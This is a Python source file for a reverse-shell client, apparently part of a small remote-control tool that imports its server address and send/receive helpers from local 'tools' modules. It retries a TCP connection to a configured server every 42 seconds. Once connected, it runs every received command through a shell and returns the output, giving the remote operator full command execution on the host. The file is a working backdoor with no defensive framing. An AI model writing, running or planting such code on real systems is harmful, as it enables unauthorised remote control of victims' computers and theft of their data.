from multiprocessing import connection
from pickle import TRUE
import socket
import subprocess
import time
import tools.config as config
import tools.utility as utility

def shell():
    while True:
        cmd = utility.reliable_recv()
        if cmd == 'quit':
            break
        else:
            exec = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            res = exec.stdout.read() + exec.stderr.read()
            res = res.decode()
            utility.reliable_send(res)

def connection():
    while True:
        time.sleep(42)
        try :
            client_socket.connect((config.server_ip,config.port))
            shell()
            break
        except:
            connection()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
## socket.AF_NET : ipv4 add
## socket.SOCK_STREAM tcp conn

connection()